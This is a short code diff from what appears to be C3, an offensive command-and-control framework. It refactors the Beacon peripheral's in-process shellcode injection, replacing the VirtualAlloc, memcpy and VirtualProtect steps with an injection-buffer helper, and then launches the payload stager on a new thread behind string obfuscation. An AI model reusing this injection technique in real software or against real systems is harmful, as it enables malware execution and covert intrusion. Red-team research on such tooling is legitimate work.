@@ -13,24 +13,14 @@ MWR::C3::Interfaces::Peripherals::Beacon::Beacon(ByteView arguments)
 	if (pipeName.empty() || !maxConnectionTrials)
 		throw std::invalid_argument(OBF("Cannot establish connection with payload with provided parameters"));
 
-	// Create an R/W region of pages in the virtual address space of current process.
-	auto codePointer = static_cast<std::uint8_t*>(VirtualAlloc(0, payload.size(), MEM_COMMIT, PAGE_READWRITE));
-	if (!codePointer)
-		throw std::runtime_error{ OBF("Couldn't allocate R/W virtual memory: ") + std::to_string(GetLastError()) + OBF(".") };
-
-	// Copy payload to the newly allocated region.
-	memcpy_s(codePointer, payload.size(), payload.data(), payload.size());
-
-	DWORD prev;
-	//Now mark the memory region R/X
-	if (!VirtualProtect(codePointer, payload.size(), PAGE_EXECUTE_READ, &prev))
-		throw std::runtime_error(OBF("Couldn't mark virtual memory as R/X. ") + std::to_string(GetLastError()));
+	// Injection buffer can be local because it's just a stager
+	WinTools::InjectionBuffer m_BeaconStager(payload);
 
 	namespace SEH = MWR::WinTools::StructuredExceptionHandling;
 	// use explicit type to bypass overload resolution
 	DWORD(WINAPI * sehWrapper)(SEH::CodePointer) = SEH::SehWrapper;
 	// Inject the payload stage into the current process.
-	if (m_BeaconThread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(sehWrapper), codePointer, 0, nullptr); m_BeaconThread == INVALID_HANDLE_VALUE)
+	if (m_BeaconThread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(sehWrapper), m_BeaconStager.Get(), 0, nullptr); m_BeaconThread == INVALID_HANDLE_VALUE)
 		throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
 
 	std::this_thread::sleep_for(std::chrono::milliseconds{ 30 }); // Give beacon thread time to start pipe.
